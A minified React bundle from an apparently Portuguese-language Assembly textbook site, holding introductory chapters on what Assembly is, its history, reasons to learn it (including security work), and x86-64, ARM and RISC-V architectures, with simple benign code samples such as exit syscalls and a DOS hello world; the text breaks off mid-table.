.token.string.url":{textDecoration:"underline"},operator:{color:"#d4d4d4"},entity:{color:"#569cd6"},"operator.arrow":{color:"#569CD6"},atrule:{color:"#ce9178"},"atrule.rule":{color:"#c586c0"},"atrule.url":{color:"#9cdcfe"},"atrule.url.function":{color:"#dcdcaa"},"atrule.url.punctuation":{color:"#d4d4d4"},keyword:{color:"#569CD6"},"keyword.module":{color:"#c586c0"},"keyword.control-flow":{color:"#c586c0"},function:{color:"#dcdcaa"},"function.maybe-class-name":{color:"#dcdcaa"},regex:{color:"#d16969"},important:{color:"#569cd6"},italic:{fontStyle:"italic"},"class-name":{color:"#4ec9b0"},"maybe-class-name":{color:"#4ec9b0"},console:{color:"#9cdcfe"},parameter:{color:"#9cdcfe"},interpolation:{color:"#9cdcfe"},"punctuation.interpolation-punctuation":{color:"#569cd6"},variable:{color:"#9cdcfe"},"imports.maybe-class-name":{color:"#9cdcfe"},"exports.maybe-class-name":{color:"#9cdcfe"},escape:{color:"#d7ba7d"},"tag.punctuation":{color:"#808080"},cdata:{color:"#808080"},"attr-value":{color:"#ce9178"},"attr-value.punctuation":{color:"#ce9178"},"attr-value.punctuation.attr-equals":{color:"#d4d4d4"},namespace:{color:"#4ec9b0"},'pre[class*="language-javascript"]':{color:"#9cdcfe"},'code[class*="language-javascript"]':{color:"#9cdcfe"},'pre[class*="language-jsx"]':{color:"#9cdcfe"},'code[class*="language-jsx"]':{color:"#9cdcfe"},'pre[class*="language-typescript"]':{color:"#9cdcfe"},'code[class*="language-typescript"]':{color:"#9cdcfe"},'pre[class*="language-tsx"]':{color:"#9cdcfe"},'code[class*="language-tsx"]':{color:"#9cdcfe"},'pre[class*="language-css"]':{color:"#ce9178"},'code[class*="language-css"]':{color:"#ce9178"},'pre[class*="language-html"]':{color:"#d4d4d4"},'code[class*="language-html"]':{color:"#d4d4d4"},".language-regex .token.anchor":{color:"#dcdcaa"},".language-html .token.punctuation":{color:"#808080"},'pre[class*="language-"] > code[class*="language-"]':{position:"relative",zIndex:"1"},".line-highlight.line-highlight":{background:"#f7ebc6",boxShadow:"inset 5px 0 0 #f7d87c",zIndex:"0"}};function d({code:i,language:l="nasm",filename:u}){const[m,f]=se.useState(!1),j=()=>{navigator.clipboard.writeText(i),f(!0),setTimeout(()=>f(!1),2e3)};return r.jsxs("div",{className:"rounded-xl overflow-hidden border border-border my-4 shadow-md",children:[r.jsxs("div",{className:"flex items-center justify-between px-4 py-2 bg-[#1e1e1e] border-b border-border/30",children:[r.jsxs("div",{className:"flex items-center gap-2",children:[r.jsxs("div",{className:"flex gap-1.5",children:[r.jsx("div",{className:"w-3 h-3 rounded-full bg-red-500/70"}),r.jsx("div",{className:"w-3 h-3 rounded-full bg-yellow-500/70"}),r.jsx("div",{className:"w-3 h-3 rounded-full bg-green-500/70"})]}),u&&r.jsx("span",{className:"text-xs text-muted-foreground font-mono ml-2",children:u}),!u&&r.jsx("span",{className:"text-xs text-muted-foreground font-mono ml-2",children:l})]}),r.jsxs("button",{onClick:j,className:"flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors px-2 py-1 rounded-md hover:bg-white/10",children:[m?r.jsx(Nb,{className:"w-3.5 h-3.5 text-green-400"}):r.jsx(Vb,{className:"w-3.5 h-3.5"}),m?"Copiado!":"Copiar"]})]}),r.jsx(Tf,{language:l,style:Ag,customStyle:{margin:0,borderRadius:0,fontSize:"0.82rem",background:"#1a1a2e"},showLineNumbers:!0,lineNumberStyle:{color:"#555",minWidth:"2.5em"},children:i.trim()})]})}const Rg={info:{icon:Kb,classes:"bg-blue-500/10 border-blue-500/30 text-blue-400",titleClass:"text-blue-300"},warning:{icon:dg,classes:"bg-yellow-500/10 border-yellow-500/30 text-yellow-400",titleClass:"text-yellow-300"},danger:{icon:Bb,classes:"bg-red-500/10 border-red-500/30 text-red-400",titleClass:"text-red-300"},success:{icon:Ub,classes:"bg-green-500/10 border-green-500/30 text-green-400",titleClass:"text-green-300"}};function T({type:i="info",title:l,children:u}){const m=Rg[i],f=m.icon;return r.jsxs("div",{className:et("rounded-xl border p-4 my-4 flex gap-3",m.classes),children:[r.jsx(f,{className:"w-5 h-5 mt-0.5 shrink-0"}),r.jsxs("div",{className:"text-sm",children:[l&&r.jsx("div",{className:et("font-semibold mb-1",m.titleClass),children:l}),r.jsx("div",{className:"text-foreground/80 leading-relaxed",children:u})]})]})}function Eg(){return r.jsxs(L,{title:"O que é Assembly?",subtitle:"Entenda a linguagem mais próxima do hardware que existe",difficulty:"iniciante",timeToRead:"12 min",children:[r.jsxs("p",{children:["Assembly (ou linguagem Assembly, linguagem de montagem) é uma linguagem de programação de ",r.jsx("strong",{children:"baixo nível"})," que possui uma correspondência direta, quase um-para-um, com as instruções em código de máquina da arquitetura de processador alvo. É a camada de abstração mais fina que existe entre o programador e o hardware."]}),r.jsx("h2",{children:'O que significa "baixo nível"?'}),r.jsx("p",{children:"Na hierarquia das linguagens de programação, existem dois extremos:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Alto nível:"})," Python, JavaScript, Java — abstraem completamente o hardware. Você não sabe nem precisa saber como a memória funciona."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Baixo nível:"})," C, Assembly — você controla diretamente a memória, os registradores e o comportamento do processador."]})]}),r.jsxs("p",{children:["Assembly está no nível mais baixo possível ",r.jsx("em",{children:"ainda legível por humanos"}),". Abaixo dele só há código de máquina puro — sequências de bytes."]}),r.jsxs(T,{type:"info",title:"Assembly vs Código de Máquina",children:["Código de máquina é o que o processador executa: bytes brutos como ",r.jsx("code",{children:"48 89 E5"}),". Assembly é a representação textual dessas mesmas instruções: ",r.jsx("code",{children:"mov rbp, rsp"}),". Um ",r.jsx("strong",{children:"assembler"})," (montador) converte Assembly em código de máquina."]}),r.jsx("h2",{children:"Como o processador pensa?"}),r.jsx("p",{children:"O processador executa instruções simples, uma por vez (ou em paralelo via pipelining). Cada instrução faz algo muito específico:"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Mover dados de um lugar para outro"}),r.jsx("li",{children:"Somar dois números"}),r.jsx("li",{children:"Comparar dois valores"}),r.jsx("li",{children:"Pular para outro endereço de memória"}),r.jsx("li",{children:"Ler ou escrever na memória"})]}),r.jsx("p",{children:"Em Assembly, você escreve exatamente essas operações, na ordem que quiser."}),r.jsx("h2",{children:"Exemplo: A mesma operação em 3 níveis"}),r.jsx("p",{children:"Veja como somar dois números é expresso em diferentes níveis:"}),r.jsx(d,{language:"python",filename:"alto_nivel.py",code:`# Python — alto nível
resultado = a + b`}),r.jsx(d,{language:"c",filename:"medio_nivel.c",code:`// C — nível médio
int resultado = a + b;`}),r.jsx(d,{language:"nasm",filename:"baixo_nivel.asm",code:`; Assembly x86-64 — baixo nível
; Assumindo que 'a' está em rax e 'b' está em rbx
mov rax, [a]       ; carrega 'a' no registrador rax
mov rbx, [b]       ; carrega 'b' no registrador rbx
add rax, rbx       ; soma: rax = rax + rbx
mov [resultado], rax ; salva o resultado na memória`}),r.jsx("h2",{children:"Por que Assembly ainda existe?"}),r.jsx("p",{children:"Em 2025, compiladores modernos como GCC e Clang geram código Assembly extremamente otimizado. Então por que ainda escrever Assembly manualmente?"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Segurança e hacking:"})," Análise de malware, exploitation, engenharia reversa e shellcoding exigem leitura e escrita de Assembly."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Sistemas embarcados:"})," Bootloaders, drivers de hardware e código de inicialização frequentemente precisam de Assembly."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Otimização ultra-específica:"})," SIMD manual (SSE/AVX) para algoritmos de processamento de imagem, criptografia e IA."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Sistemas operacionais:"})," O kernel Linux tem partes em Assembly. Sem Assembly, não há SO."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Entender computação profundamente:"})," Quem entende Assembly entende TUDO sobre como computadores realmente funcionam."]})]}),r.jsx(T,{type:"success",title:"Assembly é um superpoder",children:"Programadores que entendem Assembly têm uma vantagem enorme em debugging, segurança, performance e compreensão de sistemas. É difícil, mas absolutamente vale a pena."}),r.jsx("h2",{children:"Como o Assembly é convertido em código de máquina?"}),r.jsx("p",{children:"O fluxo é:"}),r.jsxs("ol",{children:[r.jsxs("li",{children:["Você escreve código Assembly (",r.jsx("code",{children:".asm"})," ou ",r.jsx("code",{children:".s"}),")"]}),r.jsxs("li",{children:["Um ",r.jsx("strong",{children:"assembler"})," (como NASM ou GAS) converte para código objeto (",r.jsx("code",{children:".o"}),")"]}),r.jsxs("li",{children:["Um ",r.jsx("strong",{children:"linker"})," (como ",r.jsx("code",{children:"ld"}),") une objetos em um executável"]}),r.jsx("li",{children:"O sistema operacional carrega e executa"})]}),r.jsx(d,{language:"bash",filename:"fluxo.sh",code:`# Compilar Assembly com NASM + linker
nasm -f elf64 programa.asm -o programa.o
ld programa.o -o programa
./programa`}),r.jsx("h2",{children:"Famílias de Assembly"}),r.jsx("p",{children:'Não existe "um" Assembly — cada arquitetura de processador tem seu próprio conjunto de instruções (ISA — Instruction Set Architecture):'}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"x86 / x86-64 (AMD64):"})," Intel e AMD. O mais comum em computadores pessoais e servidores."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"ARM / AArch64:"})," Smartphones, Raspberry Pi, Apple Silicon (M1/M2/M3)."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"RISC-V:"})," Nova arquitetura open-source, crescendo em sistemas embarcados e educação."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"MIPS:"})," Roteadores, consoles antigos (PlayStation 1/2)."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"PowerPC:"})," Xbox 360, PlayStation 3, Macs antigos."]})]}),r.jsxs("p",{children:["Neste livro, focamos principalmente em ",r.jsx("strong",{children:"x86-64"})," (o mais relevante em 2025), com capítulos dedicados a ",r.jsx("strong",{children:"ARM"})," e ",r.jsx("strong",{children:"RISC-V"}),"."]})]})}function Cg(){return r.jsxs(L,{title:"História do Assembly",subtitle:"Da válvula termiônica ao nanômetro: como chegamos aqui",difficulty:"iniciante",timeToRead:"10 min",children:[r.jsx("p",{children:"Para entender Assembly, é essencial entender a história dos computadores. Cada geração de hardware moldou o que a linguagem precisava ser capaz de fazer."}),r.jsx("h2",{children:"1940s — Os Primeiros Computadores"}),r.jsxs("p",{children:["Os primeiros computadores eletrônicos, como o ",r.jsx("strong",{children:"ENIAC"}),' (1945), eram programados fisicamente — você movia cabos e ajustava switches para definir operações. Não existia "linguagem" nenhuma. Cada instrução era inserida diretamente no hardware.']}),r.jsxs("p",{children:["O ",r.jsx("strong",{children:"EDSAC"})," (1949) foi um dos primeiros a usar uma memória para armazenar programas. E com isso, surgiu a necessidade de escrever essas instruções de forma mais organizada."]}),r.jsx("h2",{children:"1950s — O Nascimento do Assembly"}),r.jsxs("p",{children:["Com a proliferação dos computadores, ficou inviável programar em código binário puro. Em 1947-1952, pesquisadores como ",r.jsx("strong",{children:"Kathleen Booth"})," desenvolveram as primeiras linguagens de montagem (assembly languages)."]}),r.jsxs("p",{children:["A ideia era simples: em vez de escrever ",r.jsx("code",{children:"10110000 01100001"}),", o programador escrevia ",r.jsx("code",{children:"MOV AL, 97"}),". Um programa chamado ",r.jsx("strong",{children:"assembler"})," traduziria isso para os bytes corretos."]}),r.jsx(T,{type:"info",title:"Kathleen Booth",children:"Kathleen Booth é considerada uma das inventoras da linguagem Assembly, tendo desenvolvido a linguagem de montagem para os computadores ARC e SEC em 1947."}),r.jsx("p",{children:"O IBM 704 (1954) popularizou o uso de Assembly. Programadores escreviam em Assembly e viam isso como uma revolução — afinal, antes era código binário puro!"}),r.jsx("h2",{children:"1960s — Mainframes e Variedade"}),r.jsx("p",{children:"Com a proliferação de arquiteturas (IBM 360, DEC PDP-8, etc.), cada fabricante tinha seu próprio Assembly. Um programa escrito para IBM 360 simplesmente não rodava em DEC — e vice-versa. A portabilidade era zero."}),r.jsxs("p",{children:["Foi nessa época que linguagens de alto nível como ",r.jsx("strong",{children:"FORTRAN"})," (1957) e ",r.jsx("strong",{children:"COBOL"})," (1959) ganharam popularidade, prometendo portabilidade. Mas Assembly continuou dominante para código de sistema."]}),r.jsx("h2",{children:"1970s — Unix e C mudam o jogo"}),r.jsxs("p",{children:["A linguagem C, criada por ",r.jsx("strong",{children:"Dennis Ritchie"})," em 1972 para escrever o Unix, foi um ponto de inflexão. C oferecia abstração suficiente para escrever sistemas operacionais sem precisar de Assembly para tudo — mas ainda permitia inserir Assembly quando necessário."]}),r.jsx("p",{children:"O Unix original do Bell Labs tinha partes críticas em Assembly PDP-11. O kernel Linux, criado por Linus Torvalds em 1991, também mistura C com Assembly x86."}),r.jsx("h2",{children:"1980s — x86 e a era dos PCs"}),r.jsxs("p",{children:["O ",r.jsx("strong",{children:"Intel 8086"})," (1978) lançou a arquitetura x86, que domina PCs até hoje. O ",r.jsx("strong",{children:"IBM PC"})," (1981) usava o 8088 (versão do 8086 com barramento de 8 bits)."]}),r.jsxs("p",{children:["Nessa época, Assembly ",r.jsx("strong",{children:"era"})," a linguagem dos jogos e softwares comerciais. Programadores de games como Doom (1993) usavam Assembly x86 para extrair cada ciclo de CPU possível."]}),r.jsx(d,{language:"nasm",code:`; Assembly 8086 — era dos PCs
; Hello World no DOS (INT 21h)
mov ah, 09h
mov dx, msg
int 21h
ret

msg db 'Hello, World!$'`}),r.jsx("h2",{children:"1990s — RISC vs CISC"}),r.jsxs("p",{children:["A grande batalha dos anos 90: ",r.jsx("strong",{children:"CISC"})," (Complex Instruction Set Computer — x86) vs ",r.jsx("strong",{children:"RISC"})," (Reduced Instruction Set Computer — MIPS, SPARC, PowerPC)."]}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"CISC (x86):"})," Muitas instruções complexas. Mais fácil de programar em Assembly. Instrução pode fazer várias operações."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"RISC:"})," Poucas instruções simples. Mais rápido por ter execução mais previsível. Cada instrução é simples e de tamanho fixo."]})]}),r.jsx("p",{children:"x86 ganhou o mercado de PCs graças à compatibilidade retroativa e ao marketing da Intel/AMD. RISC ganhou no mercado embarcado e mobile."}),r.jsx("h2",{children:"2000s — 64-bit e Multicore"}),r.jsxs("p",{children:["A AMD lançou o ",r.jsx("strong",{children:"x86-64"})," (AMD64) em 2003, estendendo x86 para 64 bits. A Intel adotou com o nome EM64T. O Assembly x86-64 que estudamos hoje é resultado dessa evolução."]}),r.jsx("p",{children:"Com multicore, surgiu a necessidade de programação paralela — e o Assembly precisou evoluir para lidar com instruções atômicas, barreiras de memória e cache coherence."}),r.jsx("h2",{children:"2010s-2020s — ARM, RISC-V e o presente"}),r.jsxs("p",{children:["O ARM dominou o mercado mobile. Em 2020, a Apple lançou o ",r.jsx("strong",{children:"Apple Silicon M1"})," baseado em ARM AArch64, mostrando que ARM pode competir com x86 em performance."]}),r.jsxs("p",{children:["O ",r.jsx("strong",{children:"RISC-V"}),", criado em Berkeley em 2010, tornou-se a arquitetura open-source mais promissora para sistemas embarcados e educação."]}),r.jsx(T,{type:"success",title:"Assembly em 2025",children:"Assembly não morreu — evoluiu. Hoje é essencial para: segurança cibernética, engenharia reversa, sistemas embarcados, otimização de performance crítica e desenvolvimento de compiladores."}),r.jsx("h2",{children:"Linha do Tempo Resumida"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"1945:"})," ENIAC — programação por switches e cabos"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"1947:"})," Primeiros assemblers criados por Kathleen Booth"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"1952:"})," IBM 701 — primeiro uso comercial de Assembly"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"1972:"})," C criado — Assembly perde espaço em sistemas"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"1978:"})," Intel 8086 — nasce o x86"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"1991:"})," Linux escrito em C + Assembly x86"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"2003:"})," AMD64 (x86-64) — extensão para 64 bits"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"2010:"})," RISC-V criado em Berkeley"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"2020:"})," Apple M1 — ARM conquista desktop"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"2025:"})," Assembly continua essencial em segurança, embedded e kernels"]})]})]})}function _g(){return r.jsxs(L,{title:"Por que Aprender Assembly?",subtitle:"Os motivos concretos para investir tempo em uma linguagem 'difícil'",difficulty:"iniciante",timeToRead:"8 min",children:[r.jsx("p",{children:"Em 2025, com Python, Rust e Go disponíveis, por que alguém investiria tempo em Assembly? A resposta é simples: porque certos problemas só podem ser resolvidos — ou plenamente compreendidos — com conhecimento de Assembly."}),r.jsx("h2",{children:"1. Segurança Ofensiva e Defensiva"}),r.jsx("p",{children:"Esta é a razão número um pela qual profissionais de segurança aprendem Assembly hoje:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Buffer overflow exploitation:"})," Para explorar uma vulnerabilidade, você precisa entender como a stack funciona em nível de Assembly."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Shellcoding:"})," Shellcodes são pequenos pedaços de código Assembly injetados em processos vulneráveis."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Engenharia reversa:"})," IDA Pro, Ghidra, Binary Ninja — todas as ferramentas de reversão mostram Assembly. Sem conhecê-lo, você está cego."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Análise de malware:"})," Vírus, ransomware e rootkits são distribuídos como binários. Analisá-los requer leitura de Assembly."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"CTF (Capture The Flag):"})," Competições de segurança frequentemente exigem conhecimento de Assembly."]})]}),r.jsx(T,{type:"warning",title:"Sem Assembly, você não é um hacker completo",children:"Ferramentas como Metasploit automatizam muito, mas entender o que acontece por baixo — e criar exploits customizados — exige Assembly. Todo pentest avançado vai até esse nível."}),r.jsx("h2",{children:"2. Desenvolvimento de Sistemas Operacionais"}),r.jsx("p",{children:"Nenhum sistema operacional existe sem Assembly:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Bootloader:"})," O código que roda quando o computador liga é puro Assembly (modo real 16-bit)."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Tratadores de interrupção:"})," IRQs e exceções precisam de Assembly para salvar/restaurar contexto."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Troca de contexto:"})," Switching entre processos no kernel salva registradores em Assembly."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Código de inicialização:"})," O ponto de entrada de qualquer SO tem Assembly antes de chamar a função C main()."]})]}),r.jsx("h2",{children:"3. Sistemas Embarcados e IoT"}),r.jsx("p",{children:"Microcontroladores com recursos extremamente limitados frequentemente precisam de Assembly:"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Rotinas de tempo crítico onde o C gera código demais"}),r.jsx("li",{children:"Acesso direto a periféricos e registradores de hardware"}),r.jsx("li",{children:"Bootloaders de microcontroladores (AVR, ARM Cortex-M)"}),r.jsx("li",{children:"Código de inicialização de PLCs industriais"})]}),r.jsx("h2",{children:"4. Otimização de Performance Extrema"}),r.jsx("p",{children:"Para algoritmos de performance crítica, Assembly manual pode superar qualquer compilador:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Criptografia:"})," Implementações de AES com AES-NI, SHA com extensões SHA são 10x mais rápidas que código C puro."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Processamento de imagem/vídeo:"})," Codecs de vídeo (x264, x265) usam SIMD manual em Assembly."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Machine Learning:"})," Kernels de multiplicação de matrizes usam AVX-512 para máxima throughput."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Bancos de dados:"})," SQLite e PostgreSQL têm partes em Assembly para operações críticas."]})]}),r.jsx("h2",{children:"5. Entender Compiladores e Debuggers"}),r.jsx("p",{children:"Quando você sabe Assembly, passa a entender:"}),r.jsxs("ul",{children:[r.jsx("li",{children:"O que o GCC realmente gera para seu código C"}),r.jsx("li",{children:"Por que certas otimizações do compilador funcionam"}),r.jsx("li",{children:"Como usar GDB efetivamente para debugar crashes"}),r.jsx("li",{children:"Como coredumps e stack traces realmente funcionam"}),r.jsx("li",{children:"O que `-O2` vs `-O3` realmente muda no código gerado"})]}),r.jsx("h2",{children:"6. Interesse Acadêmico e Profissional"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Cursos de Arquitetura de Computadores em universidades usam Assembly"}),r.jsx("li",{children:"Entrevistas em empresas como Google, Amazon exigem conhecimento de como o hardware funciona"}),r.jsx("li",{children:"Pesquisa em compiladores, arquitetura de processadores, hardware verification"})]}),r.jsx("h2",{children:"É realmente difícil?"}),r.jsxs("p",{children:["Assembly tem reputação de ser extremamente difícil. A realidade: é ",r.jsx("em",{children:"diferente"}),", não necessariamente mais difícil. Os conceitos fundamentais são poucos:"]}),r.jsxs("ul",{children:[r.jsx("li",{children:"Registradores (variáveis do processador)"}),r.jsx("li",{children:"Instruções (operações básicas)"}),r.jsx("li",{children:"Memória (stack e heap)"}),r.jsx("li",{children:"Saltos e loops (controle de fluxo)"}),r.jsx("li",{children:"System calls (interação com o OS)"})]}),r.jsx("p",{children:"A curva de aprendizado inicial é íngreme, mas depois que os conceitos básicos encaixam, tudo faz sentido. Este livro foi escrito para tornar essa jornada o mais suave possível."}),r.jsx(T,{type:"success",title:"Compromisso de aprendizado",children:'Com 1-2 horas por dia, em 30-60 dias você terá uma base sólida em Assembly x86-64. Não desista nas primeiras semanas — o "clique" acontece e vale cada momento investido.'})]})}function Mg(){return r.jsxs(L,{title:"Arquiteturas de Processador",subtitle:"x86, x86-64, ARM, RISC-V e as diferenças que importam",difficulty:"iniciante",timeToRead:"15 min",children:[r.jsx("p",{children:"Antes de escrever uma linha de Assembly, você precisa entender para qual processador está escrevendo. Cada arquitetura tem suas próprias instruções, convenções e quirks."}),r.jsx("h2",{children:"O que é uma ISA?"}),r.jsxs("p",{children:[r.jsx("strong",{children:"ISA (Instruction Set Architecture)"}),' é o conjunto de instruções que um processador entende. É a "língua" do processador. Processadores diferentes têm ISAs diferentes — e Assembly para um não roda em outro.']}),r.jsx("p",{children:"A ISA define:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:["Quais instruções existem (",r.jsx("code",{children:"ADD"}),", ",r.jsx("code",{children:"MOV"}),", ",r.jsx("code",{children:"JMP"}),"...)"]}),r.jsx("li",{children:"Quantos registradores existem e seus tamanhos"}),r.jsx("li",{children:"Como a memória é endereçada"}),r.jsx("li",{children:"Como interrupções e exceções funcionam"}),r.jsx("li",{children:"O modelo de memória (little-endian, big-endian)"})]}),r.jsx("h2",{children:"CISC vs RISC"}),r.jsx("p",{children:"A divisão mais fundamental no design de processadores:"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Característica"}),r.jsx("th",{children:"CISC"}),r.jsx("th",{children:"RISC"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"Exemplo"}),r.jsx("td",{children:"x86, x86-64"}),r.jsx("td",{children:"ARM, RISC-V, MIPS"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Instruções"}),r.jsx("td",{children:"Muitas, complexas, tamanho variável"}),r.jsx("td",{children:"Poucas, simples, tamanho fixo"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Ciclos por instrução"}),r.jsx("td",{children:"Variável (1-100+)"}),r.jsx("td",{children:"Geralmente 1"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Decodificação"}),r.jsx("td",{children:"Complexa e cara"}),r.jsx("td",{children:"Simples e rápida"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Registradores"}),r.jsx("td",{children:"Menos (x86: 16 gerais em 64-bit)"}),r.jsx("td",{children:"Mais (ARM64: 31, RISC-V: 32)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Uso de memória"}),r.jsx("td",{children:"Código menor"}),r.jsx("td",{children:"Código maior, mais instruções"})]})]})]}),r.jsx(T,{type:"info",title:"CISC vs RISC hoje",children:'Modernamente, a linha entre CISC e RISC borrou. Processadores x86-64 modernos internamente decodificam instruções CISC em micro-operações RISC. O x86 "parece" CISC para o programador, mas internamente é executado de forma RISC.'}),r.jsx("h2",{children:"x86 — A Arquitetura Histórica"}),r.jsx("p",{children:"Começou com o Intel 8086 em 1978 (16-bit). Evoluiu para 32-bit com o 80386 em 1985 (também chamado de IA-32 ou i386). Mantém compatibilidade retroativa absurda — um binário DOS de 1985 ainda roda em Windows 11 (em modo de compatibilidade)."}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Registradores gerais 32-bit:"})," EAX, EBX, ECX, EDX, ESI, EDI, ESP, EBP"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Endereçamento:"})," Little-endian, até 4GB de RAM em modo de 32 bits"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Sintaxes:"})," Intel (NASM) e AT&T (GAS) — duas formas de escrever o mesmo Assembly"]})]}),r.jsx("h2",{children:"x86-64 (AMD64) — O Foco deste Livro"}),r.jsx("p",{children:"Criado pela AMD em 2003, estende x86 para 64 bits. Intel adotou como EM64T. É o que roda em praticamente todo servidor, laptop e desktop em 2025."}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Registradores gerais 64-bit:"})," RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, R8-R15 (16 total)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Espaço de endereçamento:"})," Teoricamente 2^64 bytes, praticamente 256TB"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Registradores SIMD:"})," XMM0-XMM15 (128-bit), YMM0-YMM15 (256-bit), ZMM0-ZMM31 (512-bit)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Calling convention:"})," System V AMD64 ABI no Linux, Microsoft x64 no Windows"]})]}),r.jsx(d,{language:"nasm",filename:"x86_64.asm",code:`; x86-64 — sintaxe Intel (NASM)
section .text
global _start

_start:
    mov rax, 60       ; syscall number: exit
    xor rdi, rdi      ; exit code: 0
    syscall           ; chama o kernel`}),r.jsx("h2",{children:"ARM — O Gigante Mobile"}),r.jsx("p",{children:"ARM (Advanced RISC Machine) domina smartphones, tablets e sistemas embarcados. O Apple Silicon M1/M2/M3 é ARM — e mostrou ao mundo que ARM pode competir com x86 em desktops."}),r.jsx("h3",{children:"ARMv7 (32-bit)"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Registradores: R0-R15 (16 registradores de 32-bit)"}),r.jsx("li",{children:"R13 = SP (Stack Pointer), R14 = LR (Link Register), R15 = PC (Program Counter)"}),r.jsx("li",{children:"Suporte a modo Thumb (instruções de 16-bit para menor código)"})]}),r.jsx("h3",{children:"AArch64 / ARM64 (64-bit)"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Registradores: X0-X30 (31 registradores de 64-bit) + XZR (zero register)"}),r.jsx("li",{children:"W0-W30: versões 32-bit dos mesmos registradores"}),r.jsx("li",{children:"Muito mais limpo que ARMv7 — é o futuro do ARM"})]}),r.jsx(d,{language:"nasm",filename:"aarch64.s",code:`// AArch64 — sintaxe AT&T/GNU
.section .text
.global _start

_start:
    mov x0, #0       // exit code: 0
    mov x8, #93      // syscall: exit
    svc #0           // chama o kernel`}),r.jsx("h2",{children:"RISC-V — O Open Source"}),r.jsx("p",{children:'RISC-V (pronuncia-se "risk five") é uma ISA open-source criada em Berkeley em 2010. Qualquer pessoa pode implementar um processador RISC-V sem pagar royalties.'}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"RV32I:"})," Base 32-bit com 47 instruções"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"RV64I:"})," Extensão 64-bit"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Extensões:"})," M (multiplicação), A (atômico), F (float), D (double), C (compressed), V (vetorial)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"32 registradores:"})," x0-x31, onde x0 é sempre zero"]})]}),r.jsx(d,{language:"nasm",filename:"riscv.s",code:`# RISC-V — Assembly
.section .text
.global _start

_start:
    li a0, 0          # exit code: 0
    li a7, 93         # syscall: exit
    ecall             # chama o kernel`}),r.jsx("h2",{children:"Qual aprender primeiro?"}),r.jsxs(T,{type:"success",title:"Recomendação",children:["Comece com ",r.jsx("strong",{children:"x86-64"}),". É o mais usado em ambientes de desenvolvimento e segurança. Depois que os conceitos estão claros, migrar para ARM ou RISC-V é muito mais fácil — os conceitos são os mesmos, só a sintaxe e os detalhes mudam."]}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Se seu interesse é..."}),r.jsx("th",{children:"Foco em..."})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"Segurança / CTF"}),r.jsx("td",{children:"x86-64 (Linux)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Desenvolvimento de sistemas/OS"}),r.jsx("td",{children:"x86-64"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Mobile / iOS"}),r.jsx("td",{children:"AArch64 (ARM64)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Raspberry Pi / Embarcados ARM"}),r.jsx("td",{children:"ARMv7 / 